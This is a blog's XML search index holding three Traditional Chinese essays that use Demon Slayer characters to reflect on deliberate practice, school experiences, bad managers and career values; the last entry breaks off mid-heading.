<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>我妻善逸教會我的事情</title>
      <link href="/2025/08/10/kimetsu-no-yaiba/agatsuma-zenitsu-learn-one-thing/"/>
      <url>/2025/08/10/kimetsu-no-yaiba/agatsuma-zenitsu-learn-one-thing/</url>
      
        <content type="html"><![CDATA[<p>最近《鬼滅之刃：無限城篇》上映，讓我又想起了最讓我共鳴的一個角色 —— 我妻善逸。</p><p>跟其他角色比起來，善逸不像炭治郎那樣溫柔堅毅，不像宇髓天元那麼閃亮耀眼，甚至常常哭、常常喊「死定了」，明明不想戰鬥卻又總在關鍵時刻硬撐著上場。</p><p>但也正是這樣一個「怕爆、逃避、又不想讓人失望」的人物，讓我在北漂、升學與工作路上的困惑中，找到了一點力量。</p><p>如果你也曾經懷疑自己、無法做選擇、或陷入「一直練習卻沒變強」的迷惘，那麼善逸的故事或許能帶給你一些啟發。</p><h2 id="刻意練習的誤區：那些鬼滅教我的事情"><a href="#刻意練習的誤區：那些鬼滅教我的事情" class="headerlink" title="刻意練習的誤區：那些鬼滅教我的事情"></a>刻意練習的誤區：那些鬼滅教我的事情</h2><p>到了台北發展之後，接觸到了很多課程或是經驗分享，老實說剛開始覺得很棒也充滿新鮮感，但到後來慢慢覺得像肥肉充滿的滷肉飯一樣，發現吃了不一定健康也有點膩。</p><p>另外一個比較特別的是意外常在台北的麥當勞、7–11、漢堡王聽到人們在分享創業、高報酬投資還有做入會費繳交的交易，這部分實在有點問號？</p><p>所以想來談談善逸這個人物帶給我的小小啟發，想看善逸的故事，推薦可以看 17 集，傳送門在這邊，文章中的截圖大多也都是從影片中截出來的。</p><p><a href="https://www.linetv.tw/drama/10441/eps/17">https://www.linetv.tw/drama/10441/eps/17</a></p><h2 id="我妻善逸：全作最怕死的主角，卻也最讓人共鳴"><a href="#我妻善逸：全作最怕死的主角，卻也最讓人共鳴" class="headerlink" title="我妻善逸：全作最怕死的主角，卻也最讓人共鳴"></a>我妻善逸：全作最怕死的主角，卻也最讓人共鳴</h2><p>164.5 公分 | 58kg | 16 歲 | 9 月 3 日生 | 處女座</p><p>一頭黃髮的善逸在劇中是個總是貪生怕死、還沒找到喜歡的自己、遇到危險大多選擇是逃避的人物。</p><p>黃頭髮的善逸，不是染的，是怕爺爺打他逃到樹上被雷劈的結果，總是說「死定了死定了」，在劇中不是最強的，但肯定是最真實的。</p><p>善逸的膽小與逃避、內心的掙扎，對我來說反而更像一般人會遇到的樣子。</p><blockquote><p>善逸: 我一直都知道要好好努力，可是我會害怕，會逃避會哭，我想要改變，我想要成為有用的人。</p></blockquote><p>我自己以前也是那種「柿子挑軟的吃」、「只做有把握的選擇」的人，高中時從沒人問過我長大想成為什麼樣的大人，大學就要直接選一條人生路線？那時候真的滿頭問號。</p><p>當年大學畢業只推甄了系上資訊應用組，校外一所都沒申請也沒報名補習跟考試，心態上就是大學修的研究所課程不會白費，加上體驗過一學期十主科訓練後真的厭倦也不想多花成本在無意義的考試上。</p><p><img src="/2025/08/10/kimetsu-no-yaiba/agatsuma-zenitsu-learn-one-thing/like-what.jpg"></p><h2 id="鬼滅之刃教我的事：刻意練習-≠-真實成長"><a href="#鬼滅之刃教我的事：刻意練習-≠-真實成長" class="headerlink" title="鬼滅之刃教我的事：刻意練習 ≠ 真實成長"></a>鬼滅之刃教我的事：刻意練習 ≠ 真實成長</h2><p>善逸的成長歷程就像我們現實生活的投影。</p><p>善逸的爺爺曾是鬼殺隊的柱，對善逸來說更是個嚴格的教練，善逸在前期做的很多訓練其實都跟我們小時候所受的訓練一樣。</p><p>善逸即便軟弱各種逃避，卻仍能夠在爺爺的引導下成為鬼殺隊員，為了保護些什麼而成長。</p><blockquote><p>當善逸不斷的逃跑不斷的被罰，也曾跟爺爺說:「其實，我也想回應你的期待，可是我做不到，別看我這樣，我也瞞著你偷偷修行，完全沒睡，但依然沒有一點成果。」</p></blockquote><p><img src="/2025/08/10/kimetsu-no-yaiba/agatsuma-zenitsu-learn-one-thing/grand-pa-coach.jpg"></p><p>我們都曾經有過的經驗</p><ul><li>在升學、補習、職場裡，花了大量時間做「別人說應該做的練習」，結果卻不一定有效。</li><li>長輩、社會、體制給我們的設定，讓我們在害怕被處罰或被貼標籤的情況下進行訓練，去<strong>追求那些有條件的幸福</strong>。</li></ul><p>我的國中故事</p><ul><li>國中剛開始在學業成績後段的班級，全年級 14 班班排前三但校排 100~200 名。</li><li>因為後段班標籤，有時國文課甚至直接放我們去操場打球。</li></ul><p>後段班的日常</p><ul><li>因為太皮（北爛），常和同學一起被導師處罰體能訓練：鴨子走路、青蛙跳、追逐跑…</li><li>印象最深刻的懲罰：<ul><li>放學後被打屁股打到掃把斷掉</li><li>上課到一半被叫去停車場跳蛙跳</li><li>體能訓練結束後腿超痛，上下樓梯要用扶手。</li><li>隔天走路上學常常遲到 → 遲到又會被罰站 → 再被懲罰，形成惡性循環 Orz</li></ul></li><li>其他國中「技能」：<ul><li>用珍珠或衛生紙弄濕丟到牆壁或屋頂</li><li>用手指頭轉書</li></ul></li></ul><p>關鍵的轉折</p><ul><li>國中三年，我換過五次導師、三次班級。</li><li>原班級導師當時升任訓導主任，在校務會議堅持原班不能被拆。</li><li>原班級新導師主打「睡眠學習法」，甚至說如果我不適應，可以回原班上課睡覺也沒關係。</li><li>後來原班級被學校半放棄，我被抽到新的升學班，幸運遇到願意花時間引導我的老師。</li></ul><p>因為沒有被放棄，我常在下課被叫去辦公室抄筆記、午休到訓導處罰寫和補考。雖然過程嚴格，但我慢慢成長，最終進步到全校前十名。</p><blockquote><p>雖然他確實揍我揍得太兇了，但他從來沒有對我失望</p></blockquote><p>但即使到了今天，仍舊不能理解過去體制內的教育還有升學率對人生有什麼意義。</p><p>會有現在的成就，不過也只是在關鍵時期受到了幸運的引導，因此認為天賦和運氣比起努力更重要。</p><p><img src="/2025/08/10/kimetsu-no-yaiba/agatsuma-zenitsu-learn-one-thing/grand-pa-teacher.jpg"></p><p>雖然某個層面來看努力不會騙人，但以籃球賽來說平均身高 160 要打贏 180 在努力相同的情況下就是勝率較低，就像如果我沒被分配到升學班，我也不會有機會進步到全校前十名。</p><p>我認為好的教練應該是讓晚輩發現且能夠發揮長處，而不是讓肥宅刻意練習短跑或是讓肌無力的人把成為舉重選手當目標。</p><p>BTW 底下這個中文配音超級好笑 XDDD</p><iframe width="560" height="315" src="https://www.youtube.com/embed/t1WEik3dmh0?si=96NiEudTtKoWf2WW" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe><h2 id="刻意練習的盲點：印表機會考試，不代表你會生活"><a href="#刻意練習的盲點：印表機會考試，不代表你會生活" class="headerlink" title="刻意練習的盲點：印表機會考試，不代表你會生活"></a>刻意練習的盲點：印表機會考試，不代表你會生活</h2><p>上了大學之後，我放棄理解理工科的科目，為了通過考試接受和訓練自己成為印表機成為考試機器。</p><p>刻意練習本身是為了做腦神經迴路連接優化，在某些低階工作上是非常適合的，像是騎腳踏車、游泳初期就需要刻意練習，練習平衡和維持動力，而後就是靠神經迴路自然反應。</p><p>我考試的方法是在固定教室 + 聽固定音樂 + 抄寫特定科目的相關知識。後來甚至鍛鍊出知道花半小時可以拿幾分花一小時又能多拿幾分，有時候甚至會有這學期可以前十名的感受。</p><p>在這裡我可以很確定的告訴大家，學習做學問和考試競爭是兩件事情，會學習的人不一定會考試反之會考試的也不一定會學習。</p><p>值得注意的是腦區發展在 20+ 逐漸發展並到達顛峰，30+ 後會比較依賴過去的鍛鍊。</p><p>而因為每個人腦區神經突觸的過往發展並不同，視覺、聽覺、觸覺、抽象的反應程度也都存在著差異，這個部分就需要透過嘗試去找到適合自己的成長方式。</p><p><img src="/2025/08/10/kimetsu-no-yaiba/agatsuma-zenitsu-learn-one-thing/keep-learn-one-thing.jpg"></p><p>在學校和社會的框架中成長，過程中往往會受到很多的餵食。</p><p>在學時有應試相關套餐，職場會被推廣<strong>成功人士模板</strong>外帶全家餐，年輕一代又把這套模版稱作 Role Model。</p><p>為了符合這樣的框架，滿坑滿谷的書跟課程，被灌食幾年下來，我是真的覺得快可以噴飯了？雖然網路加速很多教學和分享很棒，但也會開始讓被餵食的我們失去思考的能力。</p><p>這類分享大多會把事拆解成有再現性的基礎功能單位，然後想辦法讓接受方能練習，會容易誤以為變強只是時間問題。</p><p>在現實中因為表現不佳、薪水太低、能力不足、不滿意現況後，就會想要偷懶的<strong>透過模版改變自己</strong>。但錯的事情練習一百次也不會有用，找了一個錯誤的方向努力到最後還是錯的，是一個愛一個不會愛你的人一輩子相對會很難感到幸福的道理。</p><p>時間拉回現在，你能夠確定愛迪生在現代還有辦法成為發明家？而不是為了還學貸和房貸選擇在台積電輪班？</p><p>沒有天賦的過度努力可能終其一生就只是個秀才而已，而在不對的時間做不對的努力可能也無法達到適合自己的成功。</p><h2 id="只有一招的善逸，卻也能開創第七型"><a href="#只有一招的善逸，卻也能開創第七型" class="headerlink" title="只有一招的善逸，卻也能開創第七型"></a>只有一招的善逸，卻也能開創第七型</h2><p>善逸一直練的是「雷之呼吸・壹之型」，一開始被人瞧不起。可是他爺爺對他說：</p><blockquote><p>培育者爺爺：「既然你只能學會一招，那就將這一招磨練到極致的極致。」</p></blockquote><p>善逸後來創造了「雷之呼吸・第七型」，那不是別人教的，是他在原本一招上磨出來的自創之招，是自己的東西。</p><p>每個人都可以練出自己的「第七型」，只不過它不會出現在成功學書籍裡，也不會在網路神人教學中找到，而是來自一次次試錯與成長。</p><blockquote><p>回到「刻意練習」的主題——為什麼明明是同一位師父，善逸卻只學會了一招？</p></blockquote><p>善逸的故事告訴我們，完全複製教練的訓練方式，不一定必要，也不一定有用。</p><p>就像善逸最後打敗師兄、完成師父未竟的使命一樣，我們不一定要成為標準答案裡那種「典型的強者」。</p><p>反而應該找出屬於自己的能力型態、節奏與專長，從那裡開創出真正的價值。</p><p><img src="/2025/08/10/kimetsu-no-yaiba/agatsuma-zenitsu-learn-one-thing/evolution-from-one-thing.jpg"></p><p>就像我，拿到大學文憑後，難道就能算是受過教育的知識份子嗎？還是其實只是一台列印速度比較慢的考試機器？</p><p>回顧過往，才發現自己在求學過程中，其實放棄了一些重要的東西。</p><p>碩士班時期，我曾經很想休學，因為初期覺得和大學差異不大，都只是被灌輸在既定框架內的知識。</p><p>直到開始寫碩士論文，我才真正避開了「刻意練習的歪樓」，學會運用所蒐集的知識，走到知識的邊界並嘗試突破。</p><p>這讓我想起了龍馬全國大賽的最後一場比賽，在想起了爸爸問他 “龍馬，你覺得網球好玩嗎？” 後進入了無我堂奧最後一道天衣無縫的境界。</p><p>這個境界說起來也蠻北爛的，就只是要在這個當下喜歡打網球。因為幸村被網球以外的事物所影響，執念太深越想追求反而越無法達到。</p><p>善逸的師兄直到最後也是搞不清楚為什麼有這第七招？ 為什麼都成為鬼還會輸了？</p><iframe width="560" height="315" src="https://www.youtube.com/embed/kPKQOmVwiTs?si=_tDiDabB8GsuNO_T" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe><p>方法與懶人包這麼多，如果照做就能變強，那整個台灣不就都是天才了嗎？</p><p>所以說，刻意練習或模仿英雄故事其實是有風險的——失敗可以輕易複製，但成功往往難以複製。</p><p>就像圍棋老師很多，但並不是每個人都能成為棋士。對棋士來說，從 0 到 1 的思考與學習過程更為重要。</p><blockquote><p>好的老師只能引導出適合後輩的成長方法，卻無法直接製造成功。</p></blockquote><p>這整個故事中，最變態的是我們在每個階段，好像都覺得要為下階段而磨練和準備，那怎麼沒有人好好想過為了現在做準備？有沒有比起模版、比起刻意練習還要重要的事情？</p><blockquote><p>這個時代，不缺算計，只差計算，比起薪水 22K，在我們剩不到 22K 的日子中，該怎麼設計我們接下來的生活？下一個十年我們又會在哪裡？</p></blockquote><iframe width="560" height="315" src="https://www.youtube.com/embed/qaCMghHWyjM?si=Gx_mwC-vqVhfm4YG" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe><p>在鬼滅之刃中，善逸這個角色，最貼近小編成長的過程也最有感觸，從小開始，從那個什麼都不會、什麼都做不好的我們，慢慢學習理解和適應社會規則，配合著社會交辦給我們的任務而努力生存，在持續的探索和更深刻的認識自己後，慢慢成為了有能力保護他人的存在。</p><p>回想起小時候，也常常透過忙碌來避開無法解決的困難和對未知的害怕，像是那些一學期八主科九主科十主科提早超修研究所課的日子，每個學期完全沒有心力去想其他的東西。</p><p>研究所的第一年每周只有被問進度，真的感受不到學習的意義，在很想休學的時候選擇申請交換學生換個方式暫停學業，一直是到寫了碩士論文才理解導師想帶給我們的是什麼。</p><blockquote><p>也許，成長的過程看的不是物質探索的速度，是看心裡放什麼東西。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 那些鬼滅告訴我的事情 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 鬼滅之刃 </tag>
            
            <tag> 我妻善逸 </tag>
            
            <tag> 鬼滅無限列車篇 </tag>
            
            <tag> 從動漫看人生 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>鬼舞辻無慘職場生存學</title>
      <link href="/2025/08/10/kimetsu-no-yaiba/kibutsuji-muzan-boss/"/>
      <url>/2025/08/10/kimetsu-no-yaiba/kibutsuji-muzan-boss/</url>
      
        <content type="html"><![CDATA[<p>各位大大安安～最近《鬼滅之刃 無限城篇》即將開播，身為鐵粉＋職場觀察員的小編，今天就來聊聊鬼舞辻無慘——這位鬼界 CEO ——如何帶隊，以及我們在職場上怎麼分辨「好主管」與「豬頭主管」。</p><p>鬼滅之刃的鬼族，正是由<strong>鬼舞辻無慘</strong>組織與統領。他是第一個鬼，也是唯一能將人類變成鬼的存在。無慘透過制度挑選出最強的十二人，也就是大名鼎鼎的<strong>十二鬼月</strong>——分為上弦與下弦，數字越小實力越強。</p><p>在劇情規則中，鬼要變強有兩種方式：</p><ul><li><strong>吸收鬼舞辻無慘的血</strong>：快速提升，但承受不了就會灰飛煙滅</li><li><strong>吃人</strong>：進步較慢，但比較穩定</li></ul><p>你可以把「無慘之血」想像成職場上的禁藥——可能讓人瞬間衝刺到高位，但一旦失敗，連轉身的機會都沒有。那些喝了血還被炎柱一刀秒掉的鬼們，就像某些職場速成班畢業卻撐不久的「天才新人」。</p><p><img src="/2025/08/10/kimetsu-no-yaiba/kibutsuji-muzan-boss/ghost-group.jpg"></p><h2 id="鬼舞辻無慘：鬼界-CEO-模型"><a href="#鬼舞辻無慘：鬼界-CEO-模型" class="headerlink" title="鬼舞辻無慘：鬼界 CEO 模型"></a>鬼舞辻無慘：鬼界 CEO 模型</h2><p>鬼王 | 是組織中最強的鬼 | 外貌為年輕男子 | 實際超過 1000 歲</p><p>在故事設定中，無慘能用自己的血將人類變成鬼並控制對方，只要手下的鬼說出有關他的情報就會被發動「詛咒」而死亡，對所有的鬼掌握著生殺大權。</p><p>放到現實公司，老闆不一定要有千年修為，但手上有「資源」和「生殺大權」，足以決定你能不能活得好。只要敢在茶水間亂聊老闆的八卦，可能下週就收到「友善離職通知」。</p><iframe width="560" height="315" src="https://www.youtube.com/embed/x4aNN-JRzmY?si=7p-PaSpEraXBa8AY" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe><h2 id="成長規則：鬼族-vs-職場人"><a href="#成長規則：鬼族-vs-職場人" class="headerlink" title="成長規則：鬼族 vs 職場人"></a>成長規則：鬼族 vs 職場人</h2><p>對於吃人鬼來說，最重要的就是讓能力增強，然後成為十二鬼月，讓自己有更高的地位，吃人鬼主要靠著兩種方式增強能力:</p><ul><li>吸無慘之血 → 快速變強但風險極高</li><li>吃人 → 穩定成長</li></ul><p>對資本主義塑造出的營利單位來說，底下的員工最重要的就是賺到更多錢，或是成為主管讓團隊賺更多的錢，一般員工主要靠著兩種方式增強賺錢能力:</p><ul><li>巴結主管或出賣自己 → 速度快但有後遺症</li><li>專業能力累積 → 速度慢但紮實</li></ul><h2 id="好主管與豬頭主管"><a href="#好主管與豬頭主管" class="headerlink" title="好主管與豬頭主管"></a>好主管與豬頭主管</h2><p>初入職場，最重要的是累積專業能力。那該怎麼判斷主管是「炎柱型」還是「下弦型」呢？</p><h3 id="有能力的主管"><a href="#有能力的主管" class="headerlink" title="有能力的主管"></a>有能力的主管</h3><ul><li>人好＋會教學：上輩子燒香遇到炎柱</li><li>人差＋會教學：像善逸的爺爺，雖嚴苛但能讓你成長</li></ul><h3 id="沒能力的主管"><a href="#沒能力的主管" class="headerlink" title="沒能力的主管"></a>沒能力的主管</h3><ul><li>人差：直接成為你的反面教材</li><li>人好：小心！可能溫水煮青蛙，讓你一直在打雜</li></ul><p>有能力的主管或同事，不管人好人差都可以在技術和態度上透過相處而學習而成長。</p><p>沒能力的爛人則可以讓你知道有多爛，讓我們之後成為自己喜歡的大人機率又更高一些。</p><p>最慘的反而是沒能力人很好的主管，可能會因為想要讓有能力的員工永遠在底下打雜，而透過特殊的操作和工作安排讓你無限打雜，<br>舉例來說</p><ul><li>很少傳承專業相關的工作經驗</li><li>常態性的錄取平庸的部屬</li><li>透過技巧讓厲害的部屬離職</li></ul><p>鬼舞辻無慘聰明的地方在透過輸血的方式讓底下的鬼無止盡的勞動，並且讓他們誤以為不需要鍛鍊只要吃人就可以變強，舉個例子來說，一個對職涯發展不好的主管會怎麼做?</p><ul><li>讓你的人生都在打雜 (告訴你去荒山野嶺吃人就是讚)</li><li>控制你學習的機會和方向 (讓你誤會上弦、下弦是得到比較多血才變強)</li><li>誤導你以為「升職」只是因為更接近核心</li></ul><p>那，在我看來上弦、下弦和一般吃人鬼之間的區別差異又在哪?! 在繼續之前我想先談談存量、增量、流量三個名詞的概念。</p><h3 id="存量、增量、流量與流量池"><a href="#存量、增量、流量與流量池" class="headerlink" title="存量、增量、流量與流量池"></a>存量、增量、流量與流量池</h3><ul><li>存量，指的是在某個時間點擁有的數量</li><li>增量，某段時間內數量的變化，增量的調整通常是透過調整組合，達造資源和效率的優化</li><li>流量，某段時間流入或流出的數量，當增量達到一個頂的時候，成長速度趨緩就會需要引進外部的流量</li><li>流量池，當流量不再增長，就要想辦法把流量收緊變成受控制且能自由運用的流量池</li></ul><p>普通的鬼，大多是在固定的地點像是荒山野嶺中隨機吃人，而且還需要和其他的鬼去競爭，在獲得人類獵物的數量上來說存量、流量、增量都是少的。</p><p>下弦的策略性較高，以無限列車篇中的下弦之一魘夢，就是透過策略來一次捕獲整台列車的人，吃一次直接抵過普通鬼一整年。</p><p><img src="/2025/08/10/kimetsu-no-yaiba/kibutsuji-muzan-boss/nightmare.jpg"></p><p>上弦在我來看除了策略以外，更多的是個人的素質和態度。</p><p>從上弦之參猗窩座就可以看出來，猗窩座當年是為了追求武藝至高的享受而成為了鬼，也就是說，本來就已經是擁有天分之人，卻比一般人還更加努力，甚至不惜為此成為了鬼。</p><p>在看到了對手炎柱杏壽郎身上的鬥氣已經接近至高領域後，甚至覺得興奮覺得好不容易會有更強的對手，希望對手炎柱也能夠變成鬼，可以一輩子不停地互相鍛鍊精進武藝。</p><p>我認為，上下弦之所以能夠吸收更多無慘大人的血，完全是因為本身的量級本來就與一般鬼不相同，下弦平時就習慣一次吃下幾百人的數量來成長，而上弦本身的肉體、精神和心理素質本來就是世界上的佼佼者。</p><blockquote><p>鬼舞辻無慘此時笑而不語，你各位韭菜都是我的流量池</p></blockquote><h2 id="面試反殺主管小技巧"><a href="#面試反殺主管小技巧" class="headerlink" title="面試反殺主管小技巧"></a>面試反殺主管小技巧</h2><p>來分享小編曾經年少無知遇到的悲劇故事，過去曾遇過很瞎的小組長，很喜歡示範 Hello World 等級的教學來耽誤大家成長的時間。當遇到問題私底下提出時，也只會跟你聊八卦，聊說其他誰誰誰也在抱怨的是什麼，覺得什麼什麼就是爛。</p><p>即使當你提出目前專案 audit 出有 critical issue 的問題、部分功能不 work 的問題、時程來不及的問題，他都沒有進行後續相關的協助和建議。唯一建議就是你看著辦，你需要多花點時間多加油，然而小弟不才當時已經天天都超工時了 QQ</p><blockquote><p>Q: 也許可以提問，當同事遇到問題的時候，會怎麼協助處理?</p></blockquote><p>另外，操作資訊不對襯也是種藝術，常見於能力不佳的同事，而且他會努力的卡住訊息樞紐的位置，也就是<a href="https://linyencheng.github.io/2020/10/28/thinking-team-building-by-math/?utm_source=medium&utm_medium=article&utm_campaign=link">接近中心性 (Closeness Centrality)，定義會是該節點與圖中所有其他節點之間的最短路徑長度之和的倒數</a> aka 東廠第一把交椅。</p><p>而更悲劇的事情則是這樣的主管其實就是這份工作或團隊發展的天花板。</p><blockquote><p>Q: 也許我們可以虛心請教，您是怎麼當上主管的?</p></blockquote><p>不過小聲說，對工程師在維護專案來說，我其實也有發現豬頭主管的優點，明顯的看得出來專案中留有各式前人的驕傲以及想要練習的最新技術，甚至同樣一種效果可以有三種以上的寫法共存，也就是說輪到你寫的時候，可以看心情三種挑一種寫，因為討論了也是你看著辦。</p><p>只要在專案開發機開發時不會當機的前提下，個人認為很適合新手員工拿來加入想學的新技術們來堆疊和煉蠱，不過小編那時候用的筆電是開沒半小時風扇就一直全速，瀏覽器稍微多開幾個 Tab 電腦就快要不行，只能說真的是有點悲劇 QQ</p><p>在這樣的情況下，各位也可以多加利用豬頭的特性，好好鍛鍊自己扛豬公的臂力，就像那些曾經拿專案來煉蠱的工程師們，想必他們經過了各種練習之後都已經成長了不少 XDDD</p>]]></content>
      
      
      <categories>
          
          <category> 那些鬼滅告訴我的事情 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 鬼滅之刃 </tag>
            
            <tag> 鬼滅無限列車篇 </tag>
            
            <tag> 從動漫看人生 </tag>
            
            <tag> 鬼舞辻無慘 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>炎柱的人生信念</title>
      <link href="/2025/08/09/kimetsu-no-yaiba/rengoku-kyoujurou-be-true-be-you/"/>
      <url>/2025/08/09/kimetsu-no-yaiba/rengoku-kyoujurou-be-true-be-you/</url>
      
        <content type="html"><![CDATA[<p>鬼滅之刃無限列車篇 × 無限城上映特別感悟</p><blockquote><p>終有一天，我們會成為未來的那個自己。</p></blockquote><p>最近《鬼滅之刃 無限城篇》即將上映，我又回頭看了《鬼滅之刃 無限列車篇》。每次看到炎柱杏壽郎那句「我會履行我的職責！」，心裡都像被烈火點燃。這不只是動漫的台詞，更是人生的提醒。</p><p>在文章開始繼續下去之前，來首歌吧 😉</p><iframe width="560" height="315" src="https://www.youtube.com/embed/ILVlVWle8m0?si=eL8_QfN_0Wf5qTyG" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe><h2 id="成為自己看得起的大人"><a href="#成為自己看得起的大人" class="headerlink" title="成為自己看得起的大人"></a>成為自己看得起的大人</h2><p>今年是我工作的第十年，不禁回想：「如果當年的我能遇到炎柱，會不會更早找到方向？」</p><blockquote><p>讀大學時，有沒有想過畢業十年後會成為什麼樣的大人?</p></blockquote><p>可是長大後呢？我們有了更多資源、更多能力，但夢想卻好像變少了。長大，究竟是為了什麼？</p><p>回想小的時候，沒錢、沒有足夠的知識、沒有資源、沒有太多權力決定事情。</p><p>如今十多年過去，長大了，這些東西都擁有更多了，但為什麼，我們卻失去所謂可能？</p><blockquote><p>長大對我們來說，代表了什麼?</p></blockquote><h2 id="價值與衝突：鬼與人之間"><a href="#價值與衝突：鬼與人之間" class="headerlink" title="價值與衝突：鬼與人之間"></a>價值與衝突：鬼與人之間</h2><p>看《鬼滅之刃》，我常覺得職場有時就像無限列車上或是無限城中的戰場。</p><p>基層員工像是拼命戰鬥的鬼殺隊劍士，薪水微薄卻依然盡力，而某些高層，則像那些安穩坐在上弦位置數十年的鬼，規則隨意改、永遠不被淘汰。</p><p>許許多多的基層員工在各自的岡位上都很努力，而我們也在進入到這個社會染缸後發現，大家應該都是常常被體制或是奇怪的事情磨到不知道自己在做什麼。</p><p>我們也可以選擇墮落，放棄良知去成為「鬼」，追求永生般的舒適，但真的值得嗎？</p><p>炎柱的回答很明確：「寧可燃燒殆盡，也不要放棄信念。」</p><p>在進入到這個社會染缸後發現，常常被體制或是奇怪的事情被磨到不知道自己在做什麼。</p><p>從小，沒有太多人告訴我該怎麼判斷是非善惡，受教育過程也沒有學會怎麼分析和做選擇，連大學都是拿分數來當參考，當年甚至單純到因為高中物理表現不錯而填了 10 個物理系志願，最後被班導師勸退建議重填。</p><p>那究竟是什麼時候，我們才能夠理解社會，會確認自己是誰，該走向哪裡? 擅長什麼? 又可以為這個環境做些什麼?</p><blockquote><p>小時後夢得不切實際，長大後卻要學著實際。我們討厭那樣的自己，無奈卻無能為力。</p></blockquote><p>病態的基層其實蠻像是在鬼滅中的吃人鬼，再努力頂多就是不斷被淘汰的下弦，為了錢而匆匆忙忙庸庸碌碌。</p><p>即便努力，對公司來說也只是一個可被替換的角色罷了，如果工作是吃人，也許可以想想吃人真的是重要的事情嗎?</p><p>部分衝突的原因我想是來自不確定性，不確定現在的資本主義社會到底會用什麼樣的功利價值來評估我們? 不確定官僚的暗黑操作是否才是正常的社會運行?</p><p>尤其是進入職場後，才發現人人都蠻會唬爛和說謊，但這終究無法讓人心安理得生活下去，其實我蠻相信好人即使知道會被騙但還是願意相信人性良善，最終，會受到傷害的還是那些說謊的人。</p><p>在我們感受到衝突和處於打雜階段的同時，是否想過上弦為什麼能像那些官能卡住上弦的位置超過數十年的原因?</p><p>也許一開始就放棄，選擇墮落開始抱怨和批評，人生就會輕鬆許多，就像在鬼滅中，只要放棄良知，選擇活在陰暗中而成為鬼，就能擁有無限的再生能力，不再面對衰老和死亡，靠著血成就自己。</p><p>但是，成為鬼去追求屬於鬼的物質後，真的就不再擁有疑惑了嗎? 如果長大了，沒有變得更好，為什麼要長大? 又為什麼要努力往前進?</p><p><img src="/2025/08/09/kimetsu-no-yaiba/rengoku-kyoujurou-be-true-be-you/spider.jpg"></p><p>在資本主義社會和淘汰制的升學體制中生長，在物質上的追求還有價值上的探索有太多太晚去理解。</p><p>從小到大在沒有安全感的時候就是不斷的存錢，長大後透過換工作來追求更高的薪水存更多的錢，也曾被同學和直屬學弟問過，那有想過什麼時候才是夠了?</p><p>當存了第一個一百萬、第二個一百萬、第三個一百萬後，人生中的價值觀似乎也沒有太多的改變。</p><h2 id="熱情：燃燒吧，直到最後一刻"><a href="#熱情：燃燒吧，直到最後一刻" class="headerlink" title="熱情：燃燒吧，直到最後一刻"></a>熱情：燃燒吧，直到最後一刻</h2><p>炎柱杏壽郎在無限列車篇最後的那場戰鬥，我體會到當價值觀活在生命之上時，可以自然而然的影響身邊的人。</p><p>那種感動會是發自內心的佩服，佩服在生死關頭那樣的不動搖和言行一致，只為了兌現自我價值。</p><blockquote><p>不管未來的路怎麼走，你都要成為一個出色的人。隨著心走自己覺得正確的道路，並且擁有火焰般燃燒的熱情。</p></blockquote><p>可以感受的出來這就是炎柱的人生價值觀，炎柱杏壽郎在最終戰死去之前，都未曾忘記要說出一些溫暖的話來鼓勵晚輩，更能深刻感受到，不在乎生死的杏壽郎對於信念貫徹的執著。</p><p><img src="/2025/08/09/kimetsu-no-yaiba/rengoku-kyoujurou-be-true-be-you/rengoku-kyoujurou.jpg"></p><p>這份信念，就像疫情期間的醫護、消防員、外送員一樣——雖然不被看見、薪水不高，但仍選擇守護他人。即使明知必死無疑，炎柱依然擋在所有人面前，說：「我會履行我的職責！在場的任何人都不會死去！」</p><p>雖然炎柱最終還是死了，但在我心裡大哥沒有輸。</p><blockquote><p>知人者智，自知者明。勝人者有力，自勝者強。知足者富，強行者有志。<br>不失其所者久，死而不亡者壽。</p></blockquote><p>這是我看到炎柱帥氣滿點後想到道德經裡面寫過的話。</p><iframe width="560" height="315" src="https://www.youtube.com/embed/HSoJZnzLXHk?si=hguKrYHIBOWY4kdJ" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe><h2 id="成長不是看速度，而是看你心裡放什麼"><a href="#成長不是看速度，而是看你心裡放什麼" class="headerlink" title="成長不是看速度，而是看你心裡放什麼"></a>成長不是看速度，而是看你心裡放什麼</h2><p>從鬼滅的炭治郎、善逸，到我們自己的人生——成長的過程中，我們都面臨無數選擇與失去。</p><p>就像是善逸的師傅說過，可以哭泣也可以逃避，但絕對不可以放棄，但我曾經因為成為考試機器考試考到很想要休學。</p><p>有時候累到想逃避，有時甚至懷疑努力有什麼用，但只要心中還有想守護的東西，我們就不會輸。</p><p>對於物質的探索，比起無止盡的追求，好像應該更多的去分析和理解目前生活的組成，探討什麼樣的生活是能夠感受滿足且踏實。</p><p>工程師的職涯探索來說，目前想到的有三點:</p><ul><li>要有夠遠的終點，讓我們不斷的精進</li><li>要練習發揮影響力，改善優化系統架構加速團隊學習和開發</li><li>要能夠符合價值觀，而不是做惱人又耗資源的專案</li></ul><p>炎柱告訴我的，是<strong>「持續精進」</strong>這四個字。</p><p>在幸運來臨之前，持續燃燒自己，推銷自己，鍛鍊自己，才有機會創造出理想的生活。</p><h2 id="最重要的創造：整個人生"><a href="#最重要的創造：整個人生" class="headerlink" 